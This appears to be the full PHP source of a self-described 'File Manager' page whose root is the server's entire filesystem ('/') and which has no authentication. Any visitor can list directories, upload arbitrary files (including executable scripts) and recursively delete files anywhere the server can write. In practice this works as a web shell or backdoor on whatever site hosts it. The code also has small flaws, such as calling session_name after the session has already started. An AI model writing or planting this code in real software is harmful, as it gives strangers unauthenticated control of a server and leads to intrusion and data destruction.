<?php
// Start the session at the very beginning
session_start();

// Enable all error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Set the session name for your file manager
session_name('filemanager');

// Define the root directory for file management
$ROOT = realpath('/');
$reqPath = isset($_GET['path']) ? trim($_GET['path'], "/") : '';
$CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);

// Ensure the requested path is within the allowed root directory
if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
    $CURRENT = $ROOT;
    $reqPath = '';
}

// Save the current path in the session for persistence across requests
$_SESSION['current_path'] = $reqPath;

/* ==========================
   POST HANDLING
   ========================== */
   
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = (string)$_POST['action'];
    $targetRel = (string)($_POST['path'] ?? '');
    $targetAbs = fm_safe_target($targetRel);

    switch ($action) {
        case 'delete':
            if ($targetAbs && $targetAbs !== $ROOT && file_exists($targetAbs)) {
                if (is_dir($targetAbs)) {
                    fm_delete_dir($targetAbs);
                } else {
                    @unlink($targetAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            $_SESSION['current_path'] = $parentRel; // Update the session path after deletion
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'create_file':
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @file_put_contents($newAbs, "");
                }
            }
            $_SESSION['current_path'] = $reqPath; // Update the session path after creation
            header("Location: ?path=" . urlencode($reqPath));
            exit;

        case 'upload':
            error_log("UPLOAD STARTED");
    
            if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
                error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $filename = basename($_FILES['upload']['name']);
            $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
            $destAbs = fm_safe_target($destRel, true);
    
            if (!$destAbs) {
                error_log("UPLOAD BLOCKED: Safe target returned null");
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $tempFile = $_FILES['upload']['tmp_name'];
    
            if (!file_exists($tempFile)) {
                error_log("UPLOAD ERROR: Temp file missing");
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $destDir = dirname($destAbs);
            if (!is_dir($destDir)) {
                mkdir($destDir, 0755, true);
            }

            if (move_uploaded_file($tempFile, $destAbs)) {
                error_log("UPLOAD SUCCESS: $destAbs");
                $_SESSION['current_path'] = $reqPath; // Update the session path after successful upload
            } else {
                error_log("UPLOAD FAILED: Move operation failed");
            }

            header("Location: ?path=" . urlencode($reqPath));
            exit;
    }
}

// After handling POST requests, ensure the current path is persistent across page reloads
$reqPath = $_SESSION['current_path'] ?? ''; // Default to root if not set in session

// Listing files and directories
$items = @scandir($CURRENT) ?: [];
$dirs = $files = [];
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    $abs = $CURRENT . '/' . $it;
    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
}
natcasesort($dirs);
natcasesort($files);
$listed = array_merge($dirs, $files);

// Helper functions
function fm_safe_target(string $rel, bool $forCreate = false): ?string {
    global $ROOT;
    
    $rel = ltrim($rel, "/");
    
    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
        error_log("SAFE_TARGET BLOCKED: Path traversal detected - $rel");
        return null;
    }
    
    $target = $ROOT . '/' . $rel;
    
    if ($forCreate) {
        $parent = dirname($target);
        $parentReal = realpath($parent);
        if ($parentReal === false) {
            if (strpos($parent, $ROOT) === 0) {
                return $target;
            }
            error_log("SAFE_TARGET BLOCKED: Parent outside ROOT - $parent");
            return null;
        }
        
        if (strpos($parentReal, $ROOT) === 0) {
            return $target;
        }
        error_log("SAFE_TARGET BLOCKED: Parent realpath outside ROOT - $parentReal");
        return null;
    }
    
    if (file_exists($target)) {
        $real = realpath($target);
        if ($real !== false && strpos($real, $ROOT) === 0) {
            return $real;
        }
        error_log("SAFE_TARGET BLOCKED: File exists but realpath failed - $target");
    } else {
        error_log("SAFE_TARGET BLOCKED: File doesn't exist - $target");
    }
    
    return null;
}

function fm_delete_dir(string $dir): bool {
    if (!is_dir($dir)) return false;
    foreach (array_diff(scandir($dir), ['.','..']) as $f) {
        $p = "$dir/$f";
        if (is_dir($p)) fm_delete_dir($p); else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_perms(string $path): string {
    return substr(sprintf('%o', fileperms($path)), -4);
}

function fm_breadcrumb(string $relPath): string {
    $parts = array_filter(explode('/', $relPath));
    $acc = '';
    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
    foreach ($parts as $p) {
        $acc .= ($acc ? '/' : '') . $p;
        $html .= ' / <a href="?path=' . urlencode($acc) . '"><b>' . htmlspecialchars($p) . '</b></a>';
    }
    $html .= '</div>';
    return $html;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>File Manager</title>
    <style>
    /* Add your custom styles here */
    :root {
        --bg: #0f172a; 
        --card: #1e293b; 
        --text: #e2e8f0;
        --pri: #3b82f6;
        --danger: #ef4444;
    }
    body {
        background: var(--bg);
        color: var(--text);
        padding: 24px;
        font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, "Helvetica Neue", Arial;
    }
    .wrap {
        max-width: 1200px;
        margin: 0 auto;
    }
    .btn {
        padding: 8px 12px;
        border: none;
        border-radius: 10px;
        background: var(--pri);
        color: #fff;
        font-weight: 600;
        cursor: pointer;
    }
    .btn.danger {
        background: var(--danger);
    }
    /* Add other styling for file list and forms */
    </style>
</head>
<body>
    <div class="wrap">
        <?php echo fm_breadcrumb($reqPath); ?>

        <!-- File manager actions (Create, Upload, etc.) -->
        <div>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="file" name="upload" required>
                <button class="btn" type="submit">Upload</button>
            </form>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($listed as $name): ?>
                    <tr>
                        <td><b><?php echo htmlspecialchars($name); ?></b></td>
                        <td>
                            <!-- Delete file -->
                            <form method="post" onsubmit="return confirm('Delete this file?');">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="path" value="<?php echo htmlspecialchars($reqPath . '/' . $name); ?>">
                                <button class="btn danger" type="submit">Delete</button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</body>
</html>
